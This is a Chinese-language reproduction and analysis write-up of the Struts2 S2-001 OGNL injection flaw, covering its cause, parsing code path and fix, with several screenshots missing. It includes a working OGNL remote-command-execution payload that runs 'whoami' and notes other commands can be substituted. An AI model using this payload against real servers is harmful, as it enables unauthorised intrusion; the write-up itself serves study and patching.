# struts-s2-001 代码执行漏洞
1、漏洞名称
漏洞名称：Struts Remote Code Exploit
漏洞编号：Struts2-001
漏洞类型：Remote Code Execution
2、漏洞原理
Struts2 是流行和成熟的基于 MVC 设计模式的 Web 应用程序框架。 Struts2 不只是 Struts1 下一个版本，它是一个完全重写的 Struts 架构。Struts2 的标签中使用的是OGNL表达式，OGNL 是 Object Graphic Navigation Language(对象图导航语言)的缩写，它是一种功能强大的表达式语言，使用它可以存取对象的任意属性，调用对象的方法，使用 OGNL 表达式的主要作用是简化访问对象中的属性值，但Struts2漏洞就源于OGNL。漏洞信息可见https://cwiki.apache.org/confluence/display/WW/S2-001



对ognl表达式的解析方法是通过递归循环的方式进行解析，导致可以对输入形如%{*}的表达式字符串进行解析。

# 漏洞复现
测试poc

%{1+1}
![Pasted image 20230519111956](http://qn.qu1u1.cn/202305191123033.png)


解析表达式，在返回框中返回2

![Pasted image 20230519112036](http://qn.qu1u1.cn/202305191123682.png)



或者直接执行命令 

%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"whoami"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
其中whoami可以换其他命令

![[Pasted image 20230519112100.png]]





#  漏洞分析
1、漏洞成因总体概览
该漏洞触发的一个因素之一是在Action执行完成之后，返回“错误”的结果到原先的带有taglib标签的jsp进行渲染，而返回的时候会对字符串进行ognl表达式递归解析。借助一个图更好理解一些

![Pasted image 20230519112140](http://qn.qu1u1.cn/202305191123653.png)

Result配置



我们看看execute方法的内在逻辑



依照struts.xml当execute返回success时，将指向success.jsp,若为error将执行index.jsp，而index.jsp中的代码如下



当其返回到index.jsp时，而jsp中有需要解析渲染的标签，又因为name中的内容为%{1+1},被当成ognl表达式执行。最后返回给index.jsp的name变量。

网上很多文章和论坛在验证这块说是当验证不通过，从而result转向原页面（index.jsp）时候会出现这个漏洞，感觉还是不够严谨，其实无论验证成功或者失败，与结果无关，真正的前提原因是无论转向哪个页面，只要出现解析标签解析输入的时候的变量name（<s:xxxx name="name">），那么payload %{*}将会进入有问题的ognl表达式解析方法中进行解析，从而造成命令执行。验证如下：

修改success.jsp，直接添加了跟index.jsp一样的内容，textfield修改为textarea



根据LoginAction.java其逻辑既

（1）index.jsp输入

（2）LoginAction处理

（3）LoginAction返回success转向success.jsp而非index.jsp原页面



2、 漏洞细节
后面的篇幅过多且复杂，想大概了解直接看最后看粗体字。

关于这段解析的细节，网络上很多文章都有写，从LoginAction到渲染的这段调用太复杂了，这里直接从doEndTag开始讲，力求通俗易懂。

从doEndTag开始分析，主要是因为从上面的漏洞概览上可知，该漏洞是在渲染返回的jsp中的标签的时候触发的。

请求payload



LoginAction处理完结果返回



doEndTag下断点



跟进component.end()



继续跟进evaluateParams



findValue既解析该表达式字符串的值，此处输入的expr的值为%{name}



表达式解析执行



获取name的值



通过getValue对name进行取值



最终返回%{1+1},while循环并未中断%{1+1}再次解析。



若expr为name则取name的值，若为1+1则直接计算其结果，若为其他的payload比如执行命令则直接执行命令。



执行结果





理一理核心关键点

（1）假设输入的是其abc或者2+2字符串，进入解析时候的表达式是%{name},而getValue("name")返回值则是2+2的字字符串，再次进入循环时，被判断不是表达式直接返回给前台（漏洞没有触发）。

（2）若输入的是%{2+2}，进入解析时候的表达式也是getValue("name")，getValue("name")返回的则是%{2+2}，而解析方法由于是循环式的，由于判断该值依然是ognl表达式，则进一步去出2+2传达给getValue，此时的getValue("2+2")，则2+2被当作表达式执行了加法。

参考文章

Struts2 001 漏洞复现&分析 - 0x28 - 博客园

S2-001漏洞复现 - 吟风芥尘 - 博客园

漏洞修复
public static Object translateVariables(char open, String expression, ValueStack stack, Class asType, TextParseUtil.ParsedValueEvaluator evaluator, int maxLoopCount) {
        Object result = expression;
 
        while(true) {
            int start = expression.indexOf(open + "{");
            int length = expression.length();
            int x = start + 2;
            int count = 1;
 
            while(start != -1 && x < length && count != 0) {
                char c = expression.charAt(x++);
                if (c == '{') {
                    ++count;
                } else if (c == '}') {
                    --count;
                }
            }
            if (loopCount > maxLoopCount) {
                // translateVariables prevent infinite loop / expression recursive evaluation
                break;
            }
            int end = x - 1;
            if (start == -1 || end == -1 || count != 0) {
                return XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);
            }
 
            String var = expression.substring(start + 2, end);
            Object o = stack.findValue(var, asType);
            if (evaluator != null) {
                o = evaluator.evaluate(o);
            }
 
            String left = expression.substring(0, start);
            String right = expression.substring(end + 1);
            if (o != null) {
                if (TextUtils.stringSet(left)) {
                    result = left + o;
                } else {
                    result = o;
                }
 
                if (TextUtils.stringSet(right)) {
                    result = result + right;
                }
 
                expression = left + o + right;
            } else {
                result = left + right;
                expression = left + right;
            }
        }
    }
这里增加了对OGNL递归解析次数的判断，当解析完一层表达式后，如图，此时loopCount > maxLoopCount，从而执行break，不再继续解析%{1+1}，默认情况下只会解析第一层：

if (loopCount > maxLoopCount) {
                // translateVariables prevent infinite loop / expression recursive evaluation
                break;
}
